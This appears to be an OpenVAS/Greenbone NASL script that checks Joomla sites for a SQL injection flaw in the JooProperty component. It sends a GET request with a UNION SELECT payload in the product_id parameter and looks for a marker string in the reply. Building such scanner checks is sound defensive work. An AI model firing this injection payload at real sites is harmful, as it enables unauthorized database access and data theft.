CPE = "cpe:/a:joomla:joomla";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103622" );
	script_bugtraq_id( 56885 );
	script_tag( name: "cvss_base", value: "8.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:P/A:N" );
	script_version( "2019-07-05T09:54:18+0000" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "Joomla! JooProperty Component SQL Injection and Cross Site Scripting Vulnerabilities" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/56885" );
	script_tag( name: "last_modification", value: "2019-07-05 09:54:18 +0000 (Fri, 05 Jul 2019)" );
	script_tag( name: "creation_date", value: "2012-12-12 12:59:16 +0100 (Wed, 12 Dec 2012)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "This script is Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "joomla_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "joomla/installed" );
	script_tag( name: "summary", value: "The JooProperty component for Joomla! is prone to an SQL-injection
vulnerability and a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.

An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in
the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials,
compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.

JooProperty 1.13.0 is vulnerable, other versions may also be affected." );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
ex = "?option=com_jooproperty&view=booking&layout=modal&product_id=1%20and%201=0%20union%20select%20111111,0x53514c2d496e6a656374696f6e2d54657374+--";
url = dir + "/" + ex;
host = http_host_name( port: port );
req = NASLString( "GET ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n\\r\\n" );
result = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(ContainsString( result, "Location" ) && !ContainsString( result, "SQL-Injection-Test" )){
	loc = eregmatch( pattern: "Location: (.*)/\\?", string: result );
	if(loc[1]){
		if(ContainsString( loc[1], "http://" )){
			_loc = loc[1] - ( "http://" + host );
			url = _loc + ex;
			req = NASLString( "GET ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n\\r\\n" );
			result = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
		}
	}
}
if(result && ContainsString( result, "SQL-Injection-Test" )){
	security_message( port: port );
	exit( 0 );
}
exit( 0 );

